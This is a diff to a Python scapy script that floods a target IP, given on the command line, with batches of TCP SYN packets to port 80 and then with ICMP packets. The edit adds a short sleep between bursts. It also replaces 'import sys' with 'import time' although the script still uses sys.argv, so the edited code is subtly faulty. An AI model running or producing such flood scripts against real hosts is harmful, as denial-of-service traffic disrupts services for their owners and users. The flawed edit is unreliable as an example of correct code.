@@ -1,5 +1,5 @@
 from scapy.all import *
-import sys
+import time
 
 # Check if target IP was provided
 if len(sys.argv) < 2:
@@ -17,6 +17,7 @@ for i in range(100):
     pkt = [IP(dst=target)/TCP(dport=80, sport=RandShort(),flags="S") 
            for _ in range (500)]
     send(pkt, verbose=0)
+    time.sleep(0.15)
     print(f"[+] Sent 500 SYN packets to {target}")
     
 print("[*] Sending ICMP flood...")
@@ -24,6 +25,7 @@ for i in range(100):
     pkt = [IP(dst=target)/ICMP() 
            for _ in range(500)]
     send(pkt, verbose=0)
+    time.sleep(0.15)
     print(f"[+] Sent 500 ICMP packets to {target}")
  
 
